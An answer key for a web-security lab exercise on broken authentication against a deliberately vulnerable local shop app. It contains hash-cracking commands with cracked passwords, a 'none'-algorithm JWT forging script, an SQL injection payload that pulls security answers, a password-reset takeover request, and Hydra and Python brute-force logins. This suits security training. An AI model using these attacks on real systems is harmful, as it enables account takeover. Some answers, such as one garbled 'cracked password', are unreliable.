# Exercise 04: Broken Authentication - ANSWERS

## Task 4.1: Password Cracking

### Hash File Creation:

```bash
# Create hashes.txt with extracted MD5 hashes
cat > hashes.txt << 'EOF'
0192023a7bbd73250516f069df18b500
e541ca7ecf72b8d1286474fc613e5e45
0c36e517e3fa95aabf1bbffc6744a4ef
f27e368016b5c89d65daf5b2b4d42c3f
EOF
```

### Cracking with Hashcat:

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for mutations
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show results
hashcat -m 0 hashes.txt --show
```

### Cracking with John the Ripper:

```bash
# Crack MD5 hashes
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --format=raw-md5 --show hashes.txt
```

### Cracked Credentials:

| Email | Password Hash | Cracked Password |
|-------|---------------|------------------|
| admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 | admin123 |
| jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 | ncc-1701 |
| bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef | OhG0dPlease1nsertLiquorHere! |
| bjoern.kimminich@gmail.com | f27e368016b5c89d65daf5b2b4d42c3f | bW9jLmxpYW1nQGhjaW5pbW1pay5teleoc |

---

## Task 4.2: JWT Token Manipulation

### Step 1: Obtain JWT Token

```bash
# Login and capture token
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' \
  -c cookies.txt -b cookies.txt

# Token is in the response as "token" field
```

### Step 2: Decode JWT

```bash
# Using command line
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicGFzc3dvcmQiOiJjYzAzZTc0N2E2YWZiYmNiZjhiZTc2NjhhY2ZlYmVlNSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI0LTAxLTAxIDEyOjAwOjAwLjAwMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI0LTAxLTAxIDEyOjAwOjAwLjAwMCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9fQ==" | base64 -d
```

### Step 3: JWT Token Attacks

#### Attack 1: None Algorithm

```python
#!/usr/bin/env python3
import jwt
import base64
import json

# Original token (replace with actual)
original_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOi..."

# Decode without verification
payload = jwt.decode(original_token, options={"verify_signature": False})
print("Original payload:", payload)

# Modify to admin
payload['data']['id'] = 1
payload['data']['email'] = 'admin@juice-sh.op'
payload['data']['role'] = 'admin'

# Create token with "none" algorithm
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{header_b64}.{payload_b64}."

print("Forged token:", forged_token)
```

#### Attack 2: Weak Secret Key

```bash
# Try to crack JWT secret using jwt-cracker
# Common weak secrets: secret, password, 123456, jwt

# Using hashcat (if you have the JWT)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Testing Forged Token:

```bash
curl http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer <forged_token>"

curl http://localhost:3000/api/Users/1 \
  -H "Authorization: Bearer <forged_token>"
```

---

## Task 4.3: Password Reset Exploitation

### Finding Security Questions:

```bash
# Get security questions for a user
curl http://localhost:3000/api/SecurityQuestions
```

### Answer for Admin Account:

**Security Question:** Your eldest siblings middle name?
**Answer:** Samuel

```bash
# Reset admin password
curl -X POST http://localhost:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@juice-sh.op",
    "answer": "Samuel",
    "new": "hacked123",
    "repeat": "hacked123"
  }'
```

### Other User Security Answers:

| User | Question | Answer |
|------|----------|--------|
| admin@juice-sh.op | Eldest sibling's middle name | Samuel |
| jim@juice-sh.op | Eldest sibling's middle name | Samuel |
| bender@juice-sh.op | Company you applied to first | Stop'n'Drop |
| mc.safesearch@juice-sh.op | Favorite movie | MC SafeSearch |

### How to Find Security Answers:

1. **OSINT on admin:** Look for "Juice Shop" creator on GitHub/social media
2. **SQL Injection:** Extract from SecurityAnswers table
3. **Brute Force:** Try common names/answers

```sql
-- SQL Injection to get security answers
')) UNION SELECT id, answer, UserId, 4, 5, 6, 7, 8, 9 FROM SecurityAnswers--
```

---

## Brute Force Attack (Challenge)

### Using Hydra:

```bash
# Brute force login
hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
```

### Using Custom Python Script:

```python
#!/usr/bin/env python3
import requests

url = "http://localhost:3000/rest/user/login"
email = "admin@juice-sh.op"
passwords = ["admin123", "password", "admin", "12345", "juice"]

for pwd in passwords:
    r = requests.post(url, json={"email": email, "password": pwd})
    if "token" in r.text:
        print(f"[+] Password found: {pwd}")
        break
    else:
        print(f"[-] Failed: {pwd}")
```

---

## Summary:

```
Cracked Passwords:
1. admin@juice-sh.op: admin123
2. jim@juice-sh.op: ncc-1701

JWT Vulnerabilities:
- Algorithm: RS256 (potentially vulnerable to none attack)
- Tokens don't expire quickly
- Forged token accepted in some endpoints

Password Reset Bypass:
- User targeted: admin@juice-sh.op
- Security question: Eldest sibling's middle name
- Answer found: Samuel (via OSINT/bruteforce)
```
